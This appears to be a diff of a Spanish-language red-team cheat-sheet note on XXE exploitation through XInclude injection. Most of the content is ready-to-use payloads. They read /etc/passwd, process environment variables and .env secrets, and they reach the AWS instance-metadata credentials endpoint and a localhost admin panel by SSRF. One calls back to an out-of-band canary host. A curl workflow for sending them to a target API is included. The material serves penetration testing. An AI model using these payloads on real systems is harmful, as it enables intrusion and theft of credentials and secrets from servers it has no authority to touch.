@@ -1,19 +1,19 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/xxe
   - technique/execution
   - asset/web-app
 primary categories:
-  - "[[Red Team]]"
+  - '[[Red Team]]'
 secondary categories:
-  - "[[Explotación]]"
+  - '[[Explotación]]'
 tertiary categories:
-  - "[[Web Explotación]]"
+  - '[[Web Explotación]]'
 kind: SubCheatSheet
 linked:
-  - "[[XML External Entity (XXE)]]"
+  - '[[XML External Entity (XXE)]]'
 ---
 # XXE - Inyección Mediante XInclude
 
@@ -21,32 +21,46 @@ linked:
 
 ## Cheatsheet
 
-|**Objetivo Estratégico**|**Descripción de la Técnica**|**Estructura del Payload**|
-|---|---|---|
-|**Extracción de Archivos Locales (Texto Plano)**|Utilizo el atributo `parse="text"` para indicar al parser que lea el recurso como texto sin procesar. Esto es fundamental para evitar errores sintácticos al leer archivos del sistema (como `/etc/passwd`) que contienen caracteres que romperían un documento XML.|`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`|
-|**Extracción de Archivos Locales (XML)**|Empleo `parse="xml"` (o simplemente omito el atributo, al ser el valor predeterminado) si el archivo que intento recuperar está estructurado como un XML válido. Si no lo es, el parser lanzará una excepción y detendrá el procesamiento.|`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="xml" href="file:///var/www/config.xml"/></foo>`|
-|**Ejecución de SSRF**|Modifico el atributo `href` para apuntar a una URL en lugar de una ruta de archivo. Esto obliga al analizador XML a realizar una petición HTTP/HTTPS desde el backend, abriendo la puerta a un ataque de [[Server-Side Request Forgery (SSRF)]].|`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/></foo>`|
-
-## Requisitos y Limitaciones
-
-- **Soporte Habilitado:** Para que la inyección sea exitosa, el parser XML subyacente (por ejemplo, en integraciones SOAP o arquitecturas Java subyacentes) debe tener la funcionalidad `XInclude` habilitada. Aunque no siempre está activa por defecto, es una característica ampliamente utilizada para la modularidad de documentos.
-- **Declaración del Namespace:** Es un requisito estricto inyectar la URL exacta del espacio de nombres `http://www.w3.org/2001/XInclude`. Si la aplicación backend sanitiza los atributos o bloquea la cadena `xmlns`, el parser no reconocerá la instrucción `<xi:include>`.
-- **Ausencia de Reflejo (Blind):** Si logro inyectar el payload pero la aplicación procesa el documento sin devolver el valor del nodo en la respuesta HTTP visible, la técnica _in-band_ falla. En este caso, el flujo de trabajo requiere pivotar hacia la exfiltración mediante [[XXE Out-of-Band (OOB)]].
-
-
-***
-
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>` | Contenido raw de `/etc/passwd` | LFI sin control del `DOCTYPE`. `parse="text"` evita XML parse del target. |
+| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///proc/self/environ"/></foo>` | Variables de entorno del proceso | Backend Linux, leak `DB_PASSWORD`/tokens. |
+| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="php://filter/read=convert.base64-encode/resource=/var/www/html/.env"/></foo>` | `.env` base64 | Target PHP, archivo con caracteres XML-rompedores. |
+| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="xml" href="file:///etc/fstab"/></foo>` | Contenido XML-parsed (sólo si el archivo es XML válido) | Archivos config XML — sino, parser explota. |
+| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/></foo>` | SSRF a IMDS AWS | Target en EC2, sin control del DOCTYPE. |
+| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://127.0.0.1:8080/admin"/></foo>` | SSRF a admin panel localhost | Servicio interno con trust en loopback. |
+| `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://canary.oast.fun/probe"/></foo>` | Callback DNS+HTTP a Collaborator | Detección blind cuando no se refleja contenido. |
 ^xxe-xinclude
+
+### Workflow rápido
+
+```bash
+# 1. Probe inocuo — confirmar que XInclude resuelve
+curl -X POST https://target/api -H 'Content-Type: application/xml' \
+  --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>'
+
+# 2. Si el input se embebe en un XML mayor (ej: JSON convertido a SOAP), no necesitás DOCTYPE
+# Inyectás solo el nodo XInclude dentro del campo controlado.
+
+# 3. Si XInclude está bloqueado pero hay control de DOCTYPE → usar [[XXE - Clásico In-band]]
+```
+
+___
 
 ## Overview
 
-La inyección de XInclude es una técnica alternativa de [[XXE]] que se emplea cuando la aplicación objetivo recibe una entrada (incluso en formatos no XML, como JSON o parámetros POST convencionales) y la incrusta directamente dentro de un documento XML en el servidor antes de analizarlo. En este escenario, como no hay control sobre el inicio del documento ni acceso al preámbulo, resulta imposible declarar o modificar la etiqueta `DOCTYPE` para definir entidades externas.
+XInclude se usa cuando el atacante **no controla el inicio del documento XML** ni el `DOCTYPE` (porque la app envuelve el input dentro de un XML mayor en backend, p.ej. SOAP/JSON-to-XML). La especificación XInclude permite ensamblar documentos a partir de fragmentos externos.
 
-Para eludir esta restricción y lograr el mismo impacto, se utiliza la especificación `XInclude`, diseñada para construir documentos XML a partir de fragmentos o archivos externos. Para que el ataque funcione en un nodo inyectado, se debe declarar explícitamente el espacio de nombres de XInclude (`xmlns:xi`) y luego invocar el archivo o recurso deseado.
+### Requisitos
 
-***
+- Parser con XInclude habilitado. Java es el caso más común — `XMLInputFactory` con `XINCLUDE_AWARE=true`. Algunas libs lo activan por default.
+- Namespace `xmlns:xi="http://www.w3.org/2001/XInclude"` declarado en el nodo controlado.
+- `parse="text"` para archivos no-XML; `parse="xml"` (default) sólo si el target es XML válido.
 
-## Notas Relacionadas
+### Limitaciones
 
+- **Sanitización de `xmlns`:** algunos WAFs eliminan declaraciones de namespace → falla.
+- **Ausencia de reflejo:** si la app procesa pero no devuelve el resultado → pivotar a [[XXE - Out-of-Band (OOB) y DTDs Externos]] con callback HTTP.
+- **No hay DOCTYPE:** las defensas que sólo bloquean `<!DOCTYPE` no aplican — XInclude es alternativa directa.
 
 ***
